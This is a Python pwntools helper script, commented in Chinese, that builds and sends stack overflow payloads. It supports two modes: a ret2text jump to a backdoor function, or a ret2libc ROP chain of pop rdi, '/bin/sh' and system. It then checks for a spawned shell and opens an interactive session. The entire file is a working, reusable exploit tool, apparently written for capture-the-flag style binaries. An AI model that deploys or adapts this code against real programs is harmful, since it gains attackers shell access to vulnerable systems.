from pwn import *

def loop2text(padding, return_addr=None, pop_rdi=None, bin_sh_addr=None, system=None, ret=None, io=None, send_method='sendline'):
    """
    构造并发送 payload。支持两种模式：
    1. 简单 ret2text: 仅跳转到后门函数 (return_addr)
    2. ret2libc/ROP: pop_rdi + bin_sh + system 调用

    模式 1 使用方法:
    loop2text(padding=..., return_addr=...)

    模式 2 使用方法:
    loop2text(padding=..., pop_rdi=..., bin_sh_addr=..., system=..., ret=...)

    :param padding: 填充长度 (int) 或填充内容 (bytes)
    :param return_addr: (模式1) 直接跳转的返回地址
    :param pop_rdi: (模式2) pop rdi; ret gadget 地址
    :param bin_sh_addr: (模式2) /bin/sh 字符串地址
    :param system: (模式2) system 函数地址
    :param ret: (可选) ret gadget 地址，用于栈对齐
    :param io: (可选) pwntools 的 io 对象
    :param send_method: (可选) 发送方法 'send'/'sendline'
    :return: 构造的 payload (bytes)
    """
    
    # 处理 padding
    if isinstance(padding, int):
        payload = b'a' * padding
    elif isinstance(padding, bytes):
        payload = padding
    else:
        raise ValueError("Padding must be int or bytes")

    # 模式选择逻辑
    if pop_rdi and bin_sh_addr and system:
        # 模式 2: ROP chain for system('/bin/sh')
        if ret:
            payload += p64(ret)  # 可选的栈对齐 gadget
        
        payload += p64(pop_rdi)
        payload += p64(bin_sh_addr)
        payload += p64(system)
        
        target_info = f"ROP Chain (system={hex(system)})"
        
    elif return_addr:
        # 模式 1: Simple ret2text
        payload += p64(return_addr)
        target_info = f"Return Address: {hex(return_addr)}"
        
    else:
        raise ValueError("必须提供 return_addr (模式1) 或 pop_rdi, bin_sh_addr, system (模式2)")
    
    if io:
        print(f"[*] Sending payload with length: {len(payload)}")
        print(f"[*] Target: {target_info}")
        
        # 使用指定的发送方法
        if send_method == 'send':
            io.send(payload)
        elif send_method == 'sendline':
            io.sendline(payload)
        else:
            raise ValueError("send_method must be 'send' or 'sendline'")
        
        try:
            # 简单的 shell 探测 (可能需要根据实际情况调整)
            io.sendline(b'echo loopwn_check')
            output = io.recvuntil(b'loopwn_check', timeout=1)
            
            if b'loopwn_check' in output:
                print("[+] Congratulation! You got a shell!")
            else:
                print("[-] Failed to get a shell (Timeout or no echo).")
        except:
            pass

        io.interactive()
        
    return payload
